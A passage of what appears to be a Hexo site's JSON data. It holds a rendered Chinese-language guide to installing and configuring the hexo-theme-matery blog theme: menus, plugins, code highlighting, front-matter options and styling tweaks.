<code>date</code> 的值来作为唯一标识的。</li>\n<li>如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 <code>_config.yml</code> 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：<a href=\"http://tool.oschina.net/encrypt?type=2\">开源中国在线工具</a>、<a href=\"http://encode.chahuo.com/\">chahuo</a>、<a href=\"http://tool.chinaz.com/tools/hash.aspx\">站长工具</a>。</li>\n<li>您可以在文章md文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则</li>\n</ol>\n</blockquote>\n<p>以下为文章的 <code>Front-matter</code> 示例。</p>\n<h3 id=\"最简示例\"><a href=\"#最简示例\" class=\"headerlink\" title=\"最简示例\"></a>最简示例</h3><pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\"><span class=\"token punctuation\">---</span>\n<span class=\"token key atrule\">title</span><span class=\"token punctuation\">:</span> typora<span class=\"token punctuation\">-</span>vue<span class=\"token punctuation\">-</span>theme主题介绍\n<span class=\"token key atrule\">date</span><span class=\"token punctuation\">:</span> <span class=\"token datetime number\">2018-09-07 09:25:00</span>\n<span class=\"token punctuation\">---</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"最全示例\"><a href=\"#最全示例\" class=\"headerlink\" title=\"最全示例\"></a>最全示例</h3><pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\"><span class=\"token punctuation\">---</span>\n<span class=\"token key atrule\">title</span><span class=\"token punctuation\">:</span> typora<span class=\"token punctuation\">-</span>vue<span class=\"token punctuation\">-</span>theme主题介绍\n<span class=\"token key atrule\">date</span><span class=\"token punctuation\">:</span> <span class=\"token datetime number\">2018-09-07 09:25:00</span>\n<span class=\"token key atrule\">author</span><span class=\"token punctuation\">:</span> 赵奇\n<span class=\"token key atrule\">img</span><span class=\"token punctuation\">:</span> /source/images/xxx.jpg\n<span class=\"token key atrule\">top</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span>\n<span class=\"token key atrule\">cover</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span>\n<span class=\"token key atrule\">coverImg</span><span class=\"token punctuation\">:</span> /images/1.jpg\n<span class=\"token key atrule\">password</span><span class=\"token punctuation\">:</span> 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92\n<span class=\"token key atrule\">toc</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span>\n<span class=\"token key atrule\">mathjax</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span>\n<span class=\"token key atrule\">summary</span><span class=\"token punctuation\">:</span> 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要\n<span class=\"token key atrule\">categories</span><span class=\"token punctuation\">:</span> Markdown\n<span class=\"token key atrule\">tags</span><span class=\"token punctuation\">:</span>\n  <span class=\"token punctuation\">-</span> Typora\n  <span class=\"token punctuation\">-</span> Markdown\n<span class=\"token punctuation\">---</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"效果截图\"><a href=\"#效果截图\" class=\"headerlink\" title=\"效果截图\"></a>效果截图</h2><p><img src=\"http://static.blinkfox.com/matery-20181202-1.png\" alt=\"首页\"></p>\n<p><img src=\"http://static.blinkfox.com/matery-20181202-2.png\" alt=\"首页推荐文章\"></p>\n<p><img src=\"http://static.blinkfox.com/matery-20181202-3.png\" alt=\"首页文章列表\"></p>\n<p><img src=\"http://static.blinkfox.com/matery-20181202-7.png\" alt=\"首页文章列表\"></p>\n<p><img src=\"http://static.blinkfox.com/matery-20181202-8.png\" alt=\"首页文章列表\"></p>\n<h2 id=\"自定制修改\"><a href=\"#自定制修改\" class=\"headerlink\" title=\"自定制修改\"></a>自定制修改</h2><p>在本主题的 <code>_config.yml</code> 中可以修改部分自定义信息，有以下几个部分：</p>\n<ul>\n<li>菜单</li>\n<li>我的梦想</li>\n<li>首页的音乐播放器和视频播放器配置</li>\n<li>是否显示推荐文章名称和按钮配置</li>\n<li><code>favicon</code> 和 <code>Logo</code></li>\n<li>个人信息</li>\n<li>TOC 目录</li>\n<li>文章打赏信息</li>\n<li>复制文章内容时追加版权信息</li>\n<li>MathJax</li>\n<li>文章字数统计、阅读时长</li>\n<li>点击页面的’爱心’效果</li>\n<li>我的项目</li>\n<li>我的技能</li>\n<li>我的相册</li>\n<li><code>Gitalk</code>、<code>Gitment</code>、<code>Valine</code> 和 <code>disqus</code> 评论配置</li>\n<li><a href=\"http://busuanzi.ibruce.info/\">不蒜子统计</a>和谷歌分析（<code>Google Analytics</code>）</li>\n<li>默认特色图的集合。当文章没有设置特色图时，本主题会根据文章标题的 <code>hashcode</code> 值取余，来选择展示对应的特色图</li>\n</ul>\n<p><strong>我认为个人博客应该都有自己的风格和特色</strong>。如果本主题中的诸多功能和主题色彩你不满意，可以在主题中自定义修改，很多更自由的功能和细节点的修改难以在主题的 <code>_config.yml</code> 中完成，需要修改源代码才来完成。以下列出了可能对你有用的地方：</p>\n<h3 id=\"修改主题颜色\"><a href=\"#修改主题颜色\" class=\"headerlink\" title=\"修改主题颜色\"></a>修改主题颜色</h3><p>在主题文件的 <code>/source/css/matery.css</code> 文件中，搜索 <code>.bg-color</code> 来修改背景颜色：</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token comment\">/* 整体背景颜色，包括导航、移动端的导航、页尾、标签页等的背景颜色. */</span>\n<span class=\"token selector\">.bg-color</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token property\">background-image</span><span class=\"token punctuation\">:</span> <span class=\"token function\">linear-gradient</span><span class=\"token punctuation\">(</span>to right<span class=\"token punctuation\">,</span> #4cbf30 0%<span class=\"token punctuation\">,</span> #0f9d58 100%<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token atrule\"><span class=\"token rule\">@-webkit-keyframes</span> rainbow</span> <span class=\"token punctuation\">&#123;</span>\n   <span class=\"token comment\">/* 动态切换背景颜色. */</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token atrule\"><span class=\"token rule\">@keyframes</span> rainbow</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">/* 动态切换背景颜色. */</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"修改-banner-图和文章特色图\"><a href=\"#修改-banner-图和文章特色图\" class=\"headerlink\" title=\"修改 banner 图和文章特色图\"></a>修改 banner 图和文章特色图</h3><p>你可以直接在 <code>/source/medias/banner</code> 文件夹中更换你喜欢的 <code>banner</code> 图片，主题代码中是每天动态切换一张，只需 <code>7</code> 张即可。如果你会 <code>JavaScript</code> 代码，可以修改成你自己喜欢切换逻辑，如：随机切换等，<code>banner</code> 切换的代码位置在 <code>/layout/_partial/bg-cover-content.ejs</code> 文件的 <code>&lt;script&gt;&lt;/script&gt;</code> 代码中：</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'.bg-cover'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">css</span><span class=\"token punctuation\">(</span><span class=\"token string\">'background-image'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'url(/medias/banner/'</span> <span class=\"token operator\">+</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Date</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDay</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'.jpg)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>在 <code>/source/medias/featureimages</code> 文件夹中默认有 24 张特色图片，你可以再增加或者减少，并需要在 <code>_config.yml</code> 做同步修改。</p>\n","site":{"data":{}},"excerpt":"","more":"<div align=\"middle\">\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=1869507838&auto=1&height=66\"></iframe>\n</div>\n\n<h2 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h2><p>本主题<strong>推荐你使用 Hexo 5.0.0 及以上的版本</strong>。如果，你已经有一个自己的 <a href=\"https://hexo.io/zh-cn/\">Hexo</a> 博客了，建议你将 Hexo 升级到最新稳定的版本。</p>\n<p>点击 <a href=\"https://codeload.github.com/blinkfox/hexo-theme-matery/zip/master\">这里</a> 下载 <code>master</code> 分支的最新稳定版的代码，解压缩后，将 <code>hexo-theme-matery</code> 的文件夹复制到你 Hexo 的 <code>themes</code> 文件夹中即可。</p>\n<p>当然你也可以在你的 <code>themes</code> 文件夹下使用 <code>git clone</code> 命令来下载:</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> clone https://github.com/blinkfox/hexo-theme-matery.git<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h2 id=\"配置-主要还是看项目的-config-yml和主题的-config-yml\"><a href=\"#配置-主要还是看项目的-config-yml和主题的-config-yml\" class=\"headerlink\" title=\"配置(主要还是看项目的_config.yml和主题的_config.yml)\"></a>配置(主要还是看项目的_config.yml和主题的_config.yml)</h2><h3 id=\"切换主题\"><a href=\"#切换主题\" class=\"headerlink\" title=\"切换主题\"></a>切换主题</h3><p>修改 Hexo 根目录下的 <code>_config.yml</code> 的  <code>theme</code> 的值：<code>theme: hexo-theme-matery</code></p>\n<h4 id=\"config-yml-文件的其它修改建议\"><a href=\"#config-yml-文件的其它修改建议\" class=\"headerlink\" title=\"_config.yml 文件的其它修改建议:\"></a><code>_config.yml</code> 文件的其它修改建议:</h4><ul>\n<li>请修改主目录中 <code>_config.yml</code> 的 <code>url</code> 的值为你的网站主 <code>URL</code>（如：<code>http://lqs-1.github.io</code>）。</li>\n<li>建议修改目录中 <code>_config.yml</code> 的两个 <code>per_page</code> 的分页条数值为 <code>6</code> 的倍数，如：<code>12</code>、<code>18</code> 等，这样文章列表在各个屏幕下都能较好的显示。</li>\n<li>如果你是中文用户，则建议修改目录中 <code>_config.yml</code> 的 <code>language</code> 的值为 <code>zh-CN</code>。</li>\n</ul>\n<h3 id=\"新建分类-categories-页\"><a href=\"#新建分类-categories-页\" class=\"headerlink\" title=\"新建分类 categories 页\"></a>新建分类 categories 页</h3><p><code>categories</code> 页是用来展示所有分类的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>categories/index.md</code> 文件，那么你就需要新建一个，命令如下：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">hexo new page <span class=\"token string\">\"categories\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>编辑你刚刚新建的页面文件 <code>/source/categories/index.md</code>，至少需要以下内容：</p>\n<pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\"><span class=\"token punctuation\">---</span>\n<span class=\"token key atrule\">title</span><span class=\"token punctuation\">:</span> categories\n<span class=\"token key atrule\">date</span><span class=\"token punctuation\">:</span> <span class=\"token datetime number\">2018-09-30 17:25:30</span>\n<span class=\"token key atrule\">type</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"categories\"</span>\n<span class=\"token key atrule\">layout</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"categories\"</span>\n<span class=\"token punctuation\">---</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"新建标签-tags-页\"><a href=\"#新建标签-tags-页\" class=\"headerlink\" title=\"新建标签 tags 页\"></a>新建标签 tags 页</h3><p><code>tags</code> 页是用来展示所有标签的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>tags/index.md</code> 文件，那么你就需要新建一个，命令如下：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">hexo new page <span class=\"token string\">\"tags\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>编辑你刚刚新建的页面文件 <code>/source/tags/index.md</code>，至少需要以下内容：</p>\n<pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\"><span class=\"token punctuation\">---</span>\n<span class=\"token key atrule\">title</span><span class=\"token punctuation\">:</span> tags\n<span class=\"token key atrule\">date</span><span class=\"token punctuation\">:</span> <span class=\"token datetime number\">2018-09-30 18:23:38</span>\n<span class=\"token key atrule\">type</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"tags\"</span>\n<span class=\"token key atrule\">layout</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"tags\"</span>\n<span class=\"token punctuation\">---</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"新建-404-页\"><a href=\"#新建-404-页\" class=\"headerlink\" title=\"新建 404 页\"></a>新建 404 页</h3><p>如果在你的博客 <code>source</code> 目录下还没有 <code>404.md</code> 文件，那么你就需要新建一个</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">touch</span> <span class=\"token number\">404</span>.md<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>编辑你刚刚新建的页面文件 <code>/source/404/index.md</code>，至少需要以下内容：</p>\n<pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\"><span class=\"token punctuation\">---</span>\n<span class=\"token key atrule\">title</span><span class=\"token punctuation\">:</span> <span class=\"token number\">404</span>\n<span class=\"token key atrule\">date</span><span class=\"token punctuation\">:</span> <span class=\"token datetime number\">2018-09-30 17:25:30</span>\n<span class=\"token key atrule\">type</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"404\"</span>\n<span class=\"token key atrule\">layout</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"404\"</span>\n<span class=\"token key atrule\">description</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Oops～，我崩溃了！找不到你想要的页面 :(\"</span>\n<span class=\"token punctuation\">---</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"菜单导航配置\"><a href=\"#菜单导航配置\" class=\"headerlink\" title=\"菜单导航配置\"></a>菜单导航配置</h3><h4 id=\"配置基本菜单导航的名称、路径url和图标icon\"><a href=\"#配置基本菜单导航的名称、路径url和图标icon\" class=\"headerlink\" title=\"配置基本菜单导航的名称、路径url和图标icon.\"></a>配置基本菜单导航的名称、路径url和图标icon.</h4><p>1.菜单导航名称可以是中文也可以是英文(如：<code>Index</code>或<code>主页</code>)<br>2.图标icon 可以在<a href=\"https://fontawesome.com/icons\">Font Awesome</a> 中查找   </p>\n<pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\"><span class=\"token key atrule\">menu</span><span class=\"token punctuation\">:</span>\n  <span class=\"token key atrule\">Index</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /\n    <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>home\n  <span class=\"token key atrule\">Tags</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /tags\n    <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>tags\n  <span class=\"token key atrule\">Categories</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /categories\n    <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>bookmark\n  <span class=\"token key atrule\">Archives</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /archives\n    <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>archive<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"二级菜单配置方法\"><a href=\"#二级菜单配置方法\" class=\"headerlink\" title=\"二级菜单配置方法\"></a>二级菜单配置方法</h4><p>如果你需要二级菜单则可以在原基本菜单导航的基础上如下操作</p>\n<ol>\n<li>在需要添加二级菜单的一级菜单下添加<code>children</code>关键字(如:<code>About</code>菜单下添加<code>children</code>)     </li>\n<li>在<code>children</code>下创建二级菜单的 名称name,路径url和图标icon.      </li>\n<li>注意每个二级菜单模块前要加 <code>-</code>.     </li>\n<li>注意缩进格式  </li>\n</ol>\n<pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\"><span class=\"token key atrule\">menu</span><span class=\"token punctuation\">:</span>\n  <span class=\"token key atrule\">Index</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /\n    <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>home\n  <span class=\"token key atrule\">Tags</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /tags\n    <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>tags\n  <span class=\"token key atrule\">Categories</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /categories\n    <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>bookmark\n  <span class=\"token key atrule\">Archives</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /archives\n    <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>archive\n  <span class=\"token key atrule\">About</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /about\n    <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>user<span class=\"token punctuation\">-</span>circle<span class=\"token punctuation\">-</span>o\n  <span class=\"token key atrule\">Friends</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /friends\n    <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>address<span class=\"token punctuation\">-</span>book\n  <span class=\"token key atrule\">Medias</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>list\n    <span class=\"token key atrule\">children</span><span class=\"token punctuation\">:</span>\n      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Music\n        <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /music\n        <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>music\n      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Movies\n        <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /movies\n        <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>film\n      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Books\n        <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /books\n        <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>book\n      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Galleries\n        <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /galleries\n        <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>image<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>执行 <code>hexo clean &amp;&amp; hexo g</code> 重新生成博客文件，然后就可以在文章中对应位置看到你用<code>emoji</code>语法写的表情了。</p>\n<h3 id=\"代码高亮\"><a href=\"#代码高亮\" class=\"headerlink\" title=\"代码高亮\"></a>代码高亮</h3><p>从 Hexo5.0 版本开始自带了 <code>prismjs</code> 代码语法高亮的支持，本主题对此进行了改造支持。</p>\n<p>如果你的博客中曾经安装过 <code>hexo-prism-plugin</code> 的插件，那么你须要执行 <code>npm uninstall hexo-prism-plugin</code> 来卸载掉它，否则生成的代码中会有 <code>&amp;#123;</code> 和 <code>&amp;#125;</code> 的转义字符。</p>\n<p>然后，修改 Hexo 根目录下 <code>_config.yml</code> 文件中 <code>highlight.enable</code> 的值为 <code>false</code>，并将 <code>prismjs.enable</code> 的值设置为 <code>true</code>，主要配置如下：</p>\n<pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\"><span class=\"token key atrule\">highlight</span><span class=\"token punctuation\">:</span>\n  <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span>\n  <span class=\"token key atrule\">line_number</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span>\n  <span class=\"token key atrule\">auto_detect</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span>\n  <span class=\"token key atrule\">tab_replace</span><span class=\"token punctuation\">:</span> <span class=\"token string\">''</span>\n  <span class=\"token key atrule\">wrap</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span>\n  <span class=\"token key atrule\">hljs</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span>\n<span class=\"token key atrule\">prismjs</span><span class=\"token punctuation\">:</span>\n  <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span>\n  <span class=\"token key atrule\">preprocess</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span>\n  <span class=\"token key atrule\">line_number</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span>\n  <span class=\"token key atrule\">tab_replace</span><span class=\"token punctuation\">:</span> <span class=\"token string\">''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>主题中默认的 <code>prismjs</code> 主题是 <code>Tomorrow Night</code>，如果你想定制自己的主题，可以前往 <a href=\"https://prismjs.com/download.html\">prismjs 下载页面</a> 定制下载自己喜欢的主题 <code>css</code> 文件，然后将此 css 主题文件取名为 <code>prism.css</code>，替换掉 <code>hexo-theme-matery</code> 主题文件夹中的 <code>source/libs/prism/prism.css</code> 文件即可。</p>\n<h3 id=\"搜索\"><a href=\"#搜索\" class=\"headerlink\" title=\"搜索\"></a>搜索</h3><p>本主题中还使用到了 <a href=\"https://github.com/wzpan/hexo-generator-search\">hexo-generator-search</a> 的 Hexo 插件来做内容搜索，安装命令如下：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">npm</span> <span class=\"token function\">install</span> hexo-generator-search <span class=\"token parameter variable\">--save</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p>\n<pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\"><span class=\"token key atrule\">search</span><span class=\"token punctuation\">:</span>\n  <span class=\"token key atrule\">path</span><span class=\"token punctuation\">:</span> search.xml\n  <span class=\"token key atrule\">field</span><span class=\"token punctuation\">:</span> post<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"中文链接转拼音（建议安装）\"><a href=\"#中文链接转拼音（建议安装）\" class=\"headerlink\" title=\"中文链接转拼音（建议安装）\"></a>中文链接转拼音（建议安装）</h3><p>如果你的文章名称是中文的，那么 Hexo 默认生成的永久链接也会有中文，这样不利于 <code>SEO</code>，且 <code>gitment</code> 评论对中文链接也不支持。我们可以用 <a href=\"https://github.com/viko16/hexo-permalink-pinyin\">hexo-permalink-pinyin</a> Hexo 插件使在生成文章时生成中文拼音的永久链接。</p>\n<p>安装命令如下：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">npm</span> i hexo-permalink-pinyin <span class=\"token parameter variable\">--save</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p>\n<pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\"><span class=\"token key atrule\">permalink_pinyin</span><span class=\"token punctuation\">:</span>\n  <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span>\n  <span class=\"token key atrule\">separator</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'-'</span> <span class=\"token comment\"># default: '-'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p><strong>注</strong>：除了此插件外，<a href=\"https://github.com/rozbo/hexo-abbrlink\">hexo-abbrlink</a> 插件也可以生成非中文的链接。</p>\n</blockquote>\n<h3 id=\"文章字数统计插件（建议安装）\"><a href=\"#文章字数统计插件（建议安装）\" class=\"headerlink\" title=\"文章字数统计插件（建议安装）\"></a>文章字数统计插件（建议安装）</h3><p>如果你想要在文章中显示文章字数、阅读时长信息，可以安装 <a href=\"https://github.com/willin/hexo-wordcount\">hexo-wordcount</a>插件。</p>\n<p>安装命令如下：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">npm</span> i <span class=\"token parameter variable\">--save</span> hexo-wordcount<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>然后只需在本主题下的 <code>_config.yml</code> 文件中，将各个文章字数相关的配置激活即可：</p>\n<pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\"><span class=\"token key atrule\">postInfo</span><span class=\"token punctuation\">:</span>\n  <span class=\"token key atrule\">date</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span>\n  <span class=\"token key atrule\">update</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span>\n  <span class=\"token key atrule\">wordCount</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span> <span class=\"token comment\"># 设置文章字数统计为 true.</span>\n  <span class=\"token key atrule\">totalCount</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span> <span class=\"token comment\"># 设置站点文章总字数统计为 true.</span>\n  <span class=\"token key atrule\">min2read</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span> <span class=\"token comment\"># 阅读时长.</span>\n  <span class=\"token key atrule\">readCount</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span> <span class=\"token comment\"># 阅读次数.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"修改社交链接\"><a href=\"#修改社交链接\" class=\"headerlink\" title=\"修改社交链接\"></a>修改社交链接</h3><p>在主题的 <code>_config.yml</code> 文件中，默认支持 <code>QQ</code>、<code>GitHub</code> 和邮箱等的配置。</p>\n<h3 id=\"添加网易云音乐BGM\"><a href=\"#添加网易云音乐BGM\" class=\"headerlink\" title=\"添加网易云音乐BGM\"></a>添加网易云音乐BGM</h3><p>首先打开网易云网页版，找到想听的歌曲，然后点击生成外链</p>\n<p>复制如下代码：</p>\n<pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\">&lt;div align=\"middle\"<span class=\"token punctuation\">></span>这里粘贴刚刚复制的代码&lt;/div<span class=\"token punctuation\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n<h3 id=\"修改打赏的二维码图片\"><a href=\"#修改打赏的二维码图片\" class=\"headerlink\" title=\"修改打赏的二维码图片\"></a>修改打赏的二维码图片</h3><p>在主题文件的 <code>source/medias/reward</code> 文件中，你可以替换成你的的微信和支付宝的打赏二维码图片。</p>\n<h2 id=\"文章-Front-matter-介绍\"><a 